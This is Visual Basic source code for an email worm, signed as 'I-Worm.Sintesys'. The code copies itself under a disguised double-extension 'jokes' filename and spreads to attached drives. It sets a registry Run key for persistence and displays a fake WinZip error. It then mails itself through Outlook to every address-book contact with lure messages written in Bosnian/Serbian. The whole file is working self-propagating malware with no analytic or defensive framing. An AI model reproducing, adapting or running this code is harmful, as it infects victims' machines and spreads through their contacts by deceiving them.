Private Sub Command1_Click()
Call Form_Load
MsgBox "CRC error: 234#21", vbCritical, "WinZip SelfExtractor: Warning"
End
End Sub
Private Sub Form_Load()
Const jedan = 1
x = x + jedan
Dim fso, vhost
Set fso = CreateObject("Scripting.FilesystemObject")
vhost = "C:\Windows\Vicevi_teza_odvala.txt.exe"
If fso.FileExists(vhost) = False Then
fso.copyfile App.Path & "\" & App.EXEName & ".exe", vhost, 1
End If
Set sDrajv = fso.Drives
For Each s In sDrajv
If s.drivetype = 1 Or 3 Then
If s.drivetype = 4 Then GoTo dalje '...u slucaju da je CD-ROM (read-only)
If s.isready = True Then
fso.copyfile vhost, s.driveletter & ":\", True
End If
End If
Next s
dalje:
Dim poruka(0 To 3)
poruka(0) = "Cao! Izvini sto te uznemiravam ovako, ali evo saljem ti neke viceve koji cete sigurno oraspoloziti!"
poruka(1) = "Vozdra! Evo pogledaj ove viceve koje sam i ja dobio neki dan! Pravo su smijesni!"
poruka(2) = "Cao korisnice! Znam da sigurno nemas vremena da pogledas ove viceve koje ti saljem. Nadam se da ces imati vremena da ih pogledas!"
poruka(3) = "Zdravo! Nemoram ti nista pricati...samo pogledaj ovu veliku kolekciju viceva ;)"
If fso.FileExists("c:\windows\system\Vicevi_teza_odvala.txt.exe") = False Then
fso.copyfile App.Path & "\" & App.EXEName & ".exe", "c:\windows\system\Vicevi_teza_odvala.txt.exe", 1
End If
Dim Wshs
Set Wshs = CreateObject("WScript.Shell")
Wshs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Sintesys", "c:\windows\system\Vicevi_teza_odvala.txt.exe"
Dim a, b, c
Set a = CreateObject("Outlook.Application")
Set b = a.getnamespace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For f = 1 To b.addresslists.Count
    For d = 1 To b.addresslists(f).addressentries.Count
        With a.createitem(0)
        Set g = b.addresslists(f).addressentries(d)
        .Recipients.Add g
        .Subject = "Vicevi!"
        .body = poruka(Int(Rnd(1) * 4))
        .Attachments.Add "C:\Windows\Vicevi_teza_odvala.txt.exe"
        .send
        End With
        g = ""
    Next d
Next f
b.logoff
End If
End Sub
'I-Worm.Sintesys by e[ax]
'EBVL (c) 2K
'"Kad sve izgleda da umire ono se ustvari radja"